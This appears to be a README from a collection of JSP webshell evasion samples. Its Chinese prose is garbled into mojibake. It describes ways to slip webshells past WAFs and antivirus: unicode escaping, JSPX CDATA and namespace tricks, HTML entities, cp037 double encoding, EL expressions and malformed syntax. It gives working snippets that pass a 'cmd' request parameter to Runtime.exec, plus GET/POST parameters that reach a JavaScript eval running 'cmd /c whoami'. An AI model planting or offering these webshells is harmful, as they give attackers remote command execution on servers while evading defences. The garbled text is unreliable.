# unicode�����ƹ�
uniocde.jsp
jsp֧��unicode���룬���Webshell�������û�ж��������ȷ�Ľ��봦���ͻᱻֱ�ӡ���ά������������ƹ�
���Ը����uuuuu�ﵽ�ƹ���Ч��

# ����CDATA��ֹؼ���
CDATA.jsp
������Ҫ������jspx�Ľ��н�����ɱ��jspx��ʵ����xml��ʽ��jsp�ļ�
��jspx�У���������`<jsp:scriptlet>`������`<%%>`
��`<jsp:scriptlet>`������ʱ��������EL���ʽ���ﵽ�ƹ���Ч��
```
${Runtime.getRuntime().exec(param.cmd)}
```
��������ռ����ȥ�ƹ�������demo
```
<demo:root xmlns:bbb="http://java.sun.com/JSP/Page"  version="1.2">
<demo:scriptlet>
Runtime.getRuntime().exec(pageContext.request.getParameter("cmd"));
</demo:scriptlet>
</demo:root>
```
����`<jsp:expression>`�ƹ�
```
<jsp:root xmlns:bbb="http://java.sun.com/JSP/Page"  version="1.2">
   <jsp:expression>
   Runtime.getRuntime().exec(pageContext.request.getParameter("cmd"));
   </jsp:expression>
</jsp:root>
```
# HTMLʵ�����
html.jsp
��XML�����ͨ��htmlʵ��������������ַ�ת�壬jspxͬ���̳��˸����ԣ��ɴ�jspx�;���ʶ��htmlʵ�����
ע�⣺����CDATA�������ǲ��ܽ���htmlʵ�����ģ���֮htmlʵ�����������Ҳ���ܲ���CDATA�������޷�ִ��

# cp037����+���ر���
cp037.jsp encode3.jsp
https://tttang.com/archive/1840/

һ�ر�������õľ����������ļ�ͷֻ����utf8��ʽ���ܱ�֤�����߼�����ȷִ��
�ҵ���Ӧ��`UTF-8��UTF-16BE��UTF-16LE��ISO-10646-UCS-4��CP037`��Ϊǰ�ñ���

1. ��֤�޷�ͨ��BOMʶ����ı����ݱ���(��֤isBomPresentΪfalse)
2. ͨ��`<?xml encoding='xxx'`���Կ���sourceEnc��ֵ
3. ����ǩ`<jsp:directive.`��`<%@`������ȫ������λ�õ���Ӱ��������
4. ͨ����ǩ`<jsp:directive.`��`<%@��pageEncoding`�����ٴθ����ı����ݱ���

# EL webshell
EL.jsp
https://forum.butian.net/share/1880

- �㹻С��һ�仰�Ϳ���ʵ������ִ��+���ԵĹ���
- �������<%��Class��eval�������ַ�������bypass����
  
GET����:
```
?a=getClass&b=forName&c=javax.script.ScriptEngineManager&d=newInstance&e=getEngineByName&f=JavaScript&g=eval
```
POST����:
```
h=new java.util.Scanner(new java.lang.ProcessBuilder("cmd", "/c", "whoami").start().getInputStream(), "GBK").useDelimiter("\\A").next()
```
# ������JSP�﷨
error.jsp
JSP�ڵ�һ�����е�ʱ����ȱ�Web��������Tomcat�����Java�ļ���Ȼ��ŻᱻJdk�����ΪClass���ص�jvm�����������
JDK�ڱ����ʱ��ֻ��java�ļ��ĸ�ʽ�Ƿ���ȷ����Tomcat�ڷ���JSP�Ĳ��������Ƿ�Ϻ��﷨
���⹹����������﷨�淶��JSP���������Կ���������AST����
������������ `Using CATALINA_BASE:   "C:\Users\bmth\AppData\Local\JetBrains\IntelliJIdea2020.3\tomcat\b2597b2b-8747-4bc1-9d6d-2f71206906eb"`�ҵ�����õ�jsp�ļ�

# unicode�ķ���
unicode1~3.jspΪp�������

# bfengj
������Դ:https://github.com/bfengj/CTF/blob/main/Web/java/jsp%E5%85%8D%E6%9D%80%E7%BB%95waf/1.jsp
